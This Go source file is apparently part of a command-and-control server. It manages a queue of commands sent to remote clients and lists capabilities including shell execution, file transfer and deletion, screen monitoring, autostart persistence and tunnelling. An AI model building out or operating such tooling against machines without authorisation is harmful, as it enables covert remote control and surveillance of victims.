package command

import (
	"encoding/json"
	"fmt"
	"sync"
	"time"

	"gorm.io/gorm"

	"c2/internal/models"
)

type Command struct {
	ID        string                 `json:"id"`
	Type      string                 `json:"type"`
	Payload   map[string]interface{} `json:"payload"`
	ClientID  uint                   `json:"client_id"`
	Status    string                 `json:"status"`
	Result    string                 `json:"result"`
	CreatedAt time.Time              `json:"created_at"`
	UpdatedAt time.Time              `json:"updated_at"`
}

type Manager struct {
	db          *gorm.DB
	mu          sync.RWMutex
	commands    map[string]*Command
	clientQueue map[uint][]*Command
}

func NewManager(db *gorm.DB) *Manager {
	return &Manager{
		db:          db,
		commands:    make(map[string]*Command),
		clientQueue: make(map[uint][]*Command),
	}
}

func (m *Manager) CreateCommand(clientID uint, cmdType string, payload map[string]interface{}) (*Command, error) {
	cmd := &Command{
		ID:        generateCommandID(),
		Type:      cmdType,
		Payload:   payload,
		ClientID:  clientID,
		Status:    "pending",
		CreatedAt: time.Now(),
		UpdatedAt: time.Now(),
	}

	m.mu.Lock()
	m.commands[cmd.ID] = cmd
	m.clientQueue[clientID] = append(m.clientQueue[clientID], cmd)
	m.mu.Unlock()

	payloadBytes, _ := json.Marshal(payload)
	log := &models.CommandLog{
		ClientID:  clientID,
		CommandID: cmd.ID,
		Command:   cmdType,
		Payload:   string(payloadBytes),
		Status:    "pending",
		CreatedAt: cmd.CreatedAt,
		UpdatedAt: cmd.UpdatedAt,
	}
	m.db.Create(log)

	return cmd, nil
}

func (m *Manager) GetPendingCommands(clientID uint) []*Command {
	m.mu.RLock()
	defer m.mu.RUnlock()

	var pending []*Command
	for _, cmd := range m.clientQueue[clientID] {
		if cmd.Status == "pending" {
			pending = append(pending, cmd)
		}
	}
	return pending
}

func (m *Manager) MarkCommandRunning(cmdID string) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	cmd, ok := m.commands[cmdID]
	if !ok {
		return fmt.Errorf("command not found")
	}

	cmd.Status = "running"
	cmd.UpdatedAt = time.Now()

	m.db.Model(&models.CommandLog{}).Where("command_id = ?", cmdID).Update("status", "running")
	return nil
}

func (m *Manager) CompleteCommand(cmdID string, result string, success bool) error {
	m.mu.Lock()
	defer m.mu.Unlock()

	cmd, ok := m.commands[cmdID]
	if !ok {
		return fmt.Errorf("command not found")
	}

	if success {
		cmd.Status = "completed"
	} else {
		cmd.Status = "failed"
	}
	cmd.Result = result
	cmd.UpdatedAt = time.Now()

	m.db.Model(&models.CommandLog{}).Where("command_id = ?", cmdID).Updates(map[string]interface{}{
		"result":     result,
		"status":     cmd.Status,
		"updated_at": time.Now(),
	})

	return nil
}

// CompleteCommandOrLog 结束命令。截图等路径只回传业务帧、不发 command_response 时，
// 若内存 map 中已无该 cmd（例如被清理），仍更新 command_logs，避免前端轮询永远 running。
func (m *Manager) CompleteCommandOrLog(cmdID string, result string, success bool) {
	if cmdID == "" {
		return
	}
	if err := m.CompleteCommand(cmdID, result, success); err == nil {
		return
	}
	status := "failed"
	if success {
		status = "completed"
	}
	_ = m.db.Model(&models.CommandLog{}).Where("command_id = ?", cmdID).Updates(map[string]interface{}{
		"result":     result,
		"status":     status,
		"updated_at": time.Now(),
	})
}

func (m *Manager) GetCommandResult(cmdID string) (*Command, error) {
	m.mu.RLock()
	mem, ok := m.commands[cmdID]
	m.mu.RUnlock()

	var row models.CommandLog
	err := m.db.Where("command_id = ?", cmdID).First(&row).Error
	if err != nil {
		if ok {
			return mem, nil
		}
		return nil, fmt.Errorf("command not found")
	}
	// 数据库为终态时优先使用（防止 CompleteCommand 未同步到内存导致前端一直轮询 running）
	if row.Status == "completed" || row.Status == "failed" {
		return &Command{
			ID:        row.CommandID,
			Type:      row.Command,
			ClientID:  row.ClientID,
			Result:    row.Result,
			Status:    row.Status,
			CreatedAt: row.CreatedAt,
			UpdatedAt: row.UpdatedAt,
		}, nil
	}
	if ok {
		return mem, nil
	}
	return &Command{
		ID:        row.CommandID,
		Type:      row.Command,
		ClientID:  row.ClientID,
		Result:    row.Result,
		Status:    row.Status,
		CreatedAt: row.CreatedAt,
		UpdatedAt: row.UpdatedAt,
	}, nil
}

func (m *Manager) GetClientCommands(clientID uint, limit int) []models.CommandLog {
	var logs []models.CommandLog
	m.db.Where("client_id = ?", clientID).Order("created_at desc").Limit(limit).Find(&logs)
	return logs
}

func (m *Manager) CleanupOldCommands(maxAge time.Duration) {
	m.mu.Lock()
	defer m.mu.Unlock()

	cutoff := time.Now().Add(-maxAge)
	for id, cmd := range m.commands {
		if cmd.UpdatedAt.Before(cutoff) {
			delete(m.commands, id)
		}
	}
}

func generateCommandID() string {
	return fmt.Sprintf("cmd_%d", time.Now().UnixNano())
}

const (
	CmdExec            = "exec"
	CmdShell           = "shell"
	CmdUpload          = "upload"
	CmdDownload        = "download"
	CmdListDir         = "list_dir"
	CmdListDirChildren = "list_dir_children"
	CmdMkdir           = "mkdir"
	CmdDeleteFile      = "delete_file"
	CmdDeleteDir       = "delete_dir"
	CmdProcessList     = "process_list"
	CmdKillProcess     = "kill_process"
	CmdScreenshot      = "screenshot"
	CmdGetInfo         = "get_info"
	CmdMonitorStart    = "screen_monitor_start"
	CmdMonitorStop     = "screen_monitor_stop"
	CmdAutoStartSet    = "autostart_set"
	CmdAutoStartRemove = "autostart_remove"
	CmdTunnelConnect   = "tunnel_connect"
	CmdTunnelData      = "tunnel_data"
)
